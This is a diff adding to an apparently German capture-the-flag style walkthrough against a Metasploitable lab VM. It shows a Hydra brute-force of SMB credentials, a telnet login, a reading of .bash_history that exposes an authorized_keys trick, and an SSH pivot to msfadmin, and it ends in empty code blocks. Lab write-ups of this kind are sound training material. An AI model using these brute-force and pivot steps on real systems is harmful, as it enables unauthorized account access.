@@ -122,3 +122,79 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
 ```
+
+
+```
+$ hydra -l user -p user smb://$META
+```
+
+```
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-08 09:49:50
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking smb://192.168.220.128:445/
+[445][smb] host: 192.168.220.128   login: user   password: user
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-08 09:49:50
+```
+
+telnet liefert interassanterweise keinen Match, ftp schon.
+
+Das Passwort ist also `user`, Login über telnet:
+
+```
+telnet -l user $META
+```
+
+```
+$ sudo -l
+[sudo] password for user: 
+Sorry, user user may not run sudo on metasploitable.
+```
+
+OK, so nicht
+
+Mal alle Files anzeigen
+
+```
+$ ls -al
+total 28
+drwxr-xr-x 3 user user 4096 2010-05-07 14:38 .
+drwxr-xr-x 6 root root 4096 2010-04-16 02:16 ..
+-rw------- 1 user user  243 2025-10-08 07:53 .bash_history
+-rw-r--r-- 1 user user  220 2010-03-31 06:42 .bash_logout
+-rw-r--r-- 1 user user 2928 2010-03-31 06:42 .bashrc
+-rw-r--r-- 1 user user  586 2010-03-31 06:42 .profile
+drwx------ 2 user user 4096 2025-10-08 07:52 .ssh
+```
+
+```
+$ cat .bash_history 
+ssh-keygen -t dsa
+ls
+cd .ssh
+ls
+sudo -s
+cd /home/user
+ls
+ls .ss
+ls .ssj
+clear
+ls .ssh
+sudo cat ~/.ssh/id_dsa.pub >> /home/msfadmin/.ssh/authorized_keys
+sudo -s
+exit
+```
+
+```
+ssh msfadmin@localhost
+```
+
+```
+```
+
+```
+```
+
